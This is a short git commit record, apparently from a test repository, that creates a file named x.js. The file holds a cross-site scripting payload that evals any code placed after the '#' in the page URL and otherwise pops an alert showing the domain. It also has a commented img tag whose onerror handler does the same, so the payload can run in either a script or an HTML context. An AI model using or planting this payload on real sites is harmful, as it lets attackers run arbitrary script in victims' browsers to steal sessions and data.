14c75f67923f744f4b1b624c10c1bbbbf9b8e96f
lalka <lalka_test@mail.ru>
2021-04-13 05:41:34 +0300

    Create x.js

---
+++ x.js
@@ -0,0 +1,2 @@
+'';var msgbox;if(location.hash){eval(location.hash.slice(1))}else{alert(document.domain)}//<img src="xxx://" onerror="if(location.hash){eval(location.hash.slice(1))}else{alert(1)}">
+msgbox+1
